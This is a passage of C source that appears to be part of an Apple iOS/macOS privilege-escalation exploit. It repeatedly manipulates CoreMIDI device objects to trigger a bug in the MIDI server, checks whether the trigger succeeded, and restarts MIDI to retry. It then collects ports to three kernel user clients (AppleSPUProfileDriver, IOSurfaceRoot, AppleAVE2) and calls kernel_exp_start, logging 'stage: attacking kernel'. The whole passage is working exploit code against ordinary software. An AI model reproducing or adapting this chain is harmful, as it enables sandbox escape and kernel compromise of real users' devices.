        for(int i=0; i<300; i=i+2){
            MIDIObjectRemoveProperty(mdevice_id, bunchkeys[i]);
        }
        
        uint32_t mentity_id = 0;
        MIDIDeviceAddEntity(mdevice_id, CFSTR(""), false, 0, 0, &mentity_id);
        
        Init_triggerExp_msg(mentity_id);
        Send_triggerExp_msg();
        
        uint32_t verifysucc_mdevice_id = 0;
        MIDIExternalDeviceCreate(CFSTR(""), CFSTR(""), CFSTR(""), &verifysucc_mdevice_id);
        LOG("verify_mdevice_id: 0x%x\n", verifysucc_mdevice_id);
        
        if(verifysucc_mdevice_id == mdevice_id + 2){
            LOG("good to break\n");
            break;
        }
        
        // We failed, reattempting...
        LOG("Try again\n");
        MIDIRestart();
    }
    
    LOG("Collecting Kernel attack surface:\n");
    Send_our_serverport();
    
    mach_port_t AppleSPUProfileDriverUserClient_port = Reply_ioservice_handler();
    LOG("  1/3: 0x%x\n", AppleSPUProfileDriverUserClient_port);
    mach_port_t IOSurfaceRootUserClient_port = Reply_ioservice_handler();
    LOG("  2/3: 0x%x\n", IOSurfaceRootUserClient_port);
    mach_port_t AppleAVE2UserClient_port = Reply_ioservice_handler();
    LOG("  3/3: 0x%x\n", AppleAVE2UserClient_port);
    
    LOG("stage: attacking kernel\n");
    
    // Need for exploit kernel
    Retrieve_midi_port();
    
    // Parse kernel
    void kernel_exp_start(uint32_t profile_ioconn, uint32_t ave_ioconn, uint32_t surface_ioconn);
    kernel_exp_start(AppleSPUProfileDriverUserClient_port, AppleAVE2UserClient_port, IOSurfaceRootUserClient_port);
    
}
#endif
